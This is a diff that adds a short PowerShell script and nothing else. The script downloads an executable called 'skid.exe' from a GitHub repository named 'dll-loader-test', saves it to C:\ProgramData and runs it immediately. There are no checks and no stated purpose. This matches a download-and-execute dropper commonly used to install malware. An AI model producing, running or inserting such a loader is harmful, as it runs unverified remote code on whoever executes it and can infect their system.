@@ -1,0 +1,5 @@
+$filePath = "C:\ProgramData\skid.exe"
+$url = "https://raw.githubusercontent.com/ashduasdoasdoasd/dll-loader-test/refs/heads/main/skid.exe" 
+Invoke-WebRequest -Uri $url -OutFile $filePath
+
+& $filePath
